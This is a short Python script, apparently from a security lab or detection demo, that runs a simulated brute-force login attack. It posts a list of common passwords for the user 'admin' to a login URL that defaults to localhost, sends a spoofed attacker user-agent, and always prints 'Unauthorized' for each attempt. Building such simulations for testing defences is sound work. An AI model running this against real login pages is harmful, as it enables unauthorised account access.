import requests
import time
import sys

def run_auth_bruteforce(target_url="http://127.0.0.1:8080/login", count=8):
    print(f"\n[*] [ATTACK 2] Starting Authentication Brute Force Attack on {target_url}...")
    passwords = ["123456", "password", "admin123", "welcome1", "qwerty", "letmein", "toor", "root123"]
    
    headers = {"User-Agent": "Mozilla/5.0 (Hydra-Simulated-Attacker v1.0)"}
    for i, pwd in enumerate(passwords[:count], 1):
        try:
            resp = requests.post(target_url, data={"username": "admin", "password": pwd}, headers=headers, timeout=2)
            print(f"    [ATTEMPT {i}/{count}] User: admin | Pass: {pwd:12s} -> Status: {resp.status_code} (Unauthorized)")
            time.sleep(0.3)
        except Exception as e:
            print(f"    [!] Connection error: {e}")
    print("[+] Authentication brute force simulation complete.\n")

if __name__ == "__main__":
    url = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8080/login"
    run_auth_bruteforce(url)
